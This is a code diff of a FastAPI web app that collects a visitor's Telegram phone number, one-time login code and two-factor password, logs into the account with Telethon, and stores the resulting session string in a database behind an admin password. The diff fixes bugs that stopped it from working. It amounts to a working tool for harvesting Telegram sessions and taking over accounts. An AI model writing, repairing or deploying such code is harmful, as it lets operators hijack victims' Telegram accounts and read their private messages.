@@ -1,8 +1,8 @@
 import os
 import sqlite3
 from datetime import datetime
-from fastapi import FastAPI, Request, Form
-from fastapi.responses import HTMLResponse
+from fastapi import FastAPI, Request, Form, HTTPException
+from fastapi.responses import HTMLResponse, JSONResponse
 from fastapi.templating import Jinja2Templates
 from telethon import TelegramClient
 from telethon.sessions import StringSession
@@ -17,7 +17,7 @@ ADMIN_PASS = os.getenv("ADMIN_PASSWORD", "admin123")
 
 DB = "sessions.db"
 
-# Init DB
+# === DATABASE ===
 def init():
     conn = sqlite3.connect(DB)
     conn.execute("CREATE TABLE IF NOT EXISTS sessions (phone TEXT UNIQUE, session TEXT, time TEXT)")
@@ -65,6 +65,7 @@ def clear_attempts(phone):
     conn.commit()
     conn.close()
 
+# === ROUTES ===
 @app.get("/", response_class=HTMLResponse)
 async def home(request: Request):
     phone = request.query_params.get("phone")
@@ -73,40 +74,42 @@ async def home(request: Request):
 @app.post("/send")
 async def send_code(phone: str = Form(...)):
     if phone_exists(phone):
-        return {"error": "You already have a session. Contact admin."}
+        return JSONResponse({"error": "You already have a session. Contact admin."})
     client = TelegramClient(StringSession(), API_ID, API_HASH)
     try:
         await client.connect()
         await client.send_code_request(phone)
         await client.disconnect()
         clear_attempts(phone)
-        return {"ok": True}
+        return JSONResponse({"ok": True})
     except Exception as e:
-        return {"error": str(e)}
+        return JSONResponse({"error": str(e)})
 
 @app.post("/code")
 async def verify_code(phone: str = Form(...), code: str = Form(...)):
     if phone_exists(phone):
-        return {"error": "Session exists. Contact admin."}
+        return JSONResponse({"error": "Session exists. Contact admin."})
 
     attempts = inc_attempt(phone)
     if attempts > 3:
-        return {"error": "Too many attempts. <button onclick=\"resend()\">Resend Code</button>"}
+        return JSONResponse({"error": "Too many attempts. <button onclick=\"resend()\">Resend Code</button>"})
 
     client = TelegramClient(StringSession(), API_ID, API_HASH)
     try:
         await client.connect()
         await client.sign_in(phone, code)
-        session = client.session.save()
+        session_str = client.session.save()  # THIS LINE WAS MISSING
         await client.disconnect()
-        save_session(phone, session)
-        return {"session": session}
+        save_session(phone, session_str)
+        return JSONResponse({"session": session_str})
     except SessionPasswordNeededError:
-        return {"needs_password": True}
+        return JSONResponse({"needs_password": True})
     except PhoneCodeInvalidError:
-        return {"error": f"Wrong code. Attempt {attempts}/3"}
+        return JSONResponse({"error": f"Wrong code. Attempt {attempts}/3"})
+    except FloodWaitError as e:
+        return JSONResponse({"error": f"Wait {e.seconds}s"})
     except Exception as e:
-        return {"error": str(e)}
+        return JSONResponse({"error": str(e)})
     finally:
         if client.is_connected():
             await client.disconnect()
@@ -114,17 +117,17 @@ async def verify_code(phone: str = Form(...), code: str = Form(...)):
 @app.post("/password")
 async def password(phone: str = Form(...), code: str = Form(...), pwd: str = Form(...)):
     if phone_exists(phone):
-        return {"error": "Session exists."}
+        return JSONResponse({"error": "Session exists."})
     client = TelegramClient(StringSession(), API_ID, API_HASH)
     try:
         await client.connect()
         await client.sign_in(phone, code, password=pwd)
-        session = client.session.save()
+        session_str = client.session.save()
         await client.disconnect()
-        save_session(phone, session)
-        return {"session": session}
+        save_session(phone, session_str)
+        return JSONResponse({"session": session_str})
     except Exception as e:
-        return {"error": str(e)}
+        return JSONResponse({"error": str(e)})
     finally:
         if client.is_connected():
             await client.disconnect()
